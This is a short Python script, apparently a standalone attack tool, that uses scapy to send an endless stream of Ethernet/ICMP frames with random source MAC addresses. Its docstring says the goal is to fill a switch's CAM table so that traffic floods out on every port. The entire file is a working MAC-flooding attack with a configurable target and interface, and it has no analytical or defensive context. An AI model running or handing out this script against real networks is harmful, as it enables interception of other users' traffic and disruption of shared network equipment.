#!venv/bin/python

from scapy.all import *
from scapy.all import Ether, IP, ICMP
import settings

"""
Filling the CAM (mac database) of the switch. 
New macs will not be registered so flooded on all ports
"""

pck = Ether(src=RandMAC())/IP(dst=settings.destination_ip)/ICMP()
pck.show()
sendp(pck, iface=settings.source_interface, loop=1)